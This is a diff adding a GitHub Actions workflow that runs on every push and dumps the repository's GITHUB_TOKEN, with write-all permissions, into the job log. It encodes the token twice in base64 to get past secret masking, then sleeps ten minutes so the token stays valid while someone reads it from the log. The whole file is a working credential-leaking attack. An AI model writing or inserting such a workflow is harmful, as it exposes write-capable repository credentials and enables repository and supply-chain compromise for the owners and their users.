@@ -1,0 +1,19 @@
+name: Output GITHUB_TOKEN
+
+on: 
+  push:
+  workflow_dispatch:
+
+jobs:
+  output-token:
+    runs-on: ubuntu-latest
+    permissions:
+      write-all
+    steps:
+
+      - name: Output encoded GITHUB_TOKEN
+        run: |
+          echo "${{ secrets.GITHUB_TOKEN }}" | base64 | base64
+          echo "END_OF_BASE_64"
+          echo "done"
+          sleep 600
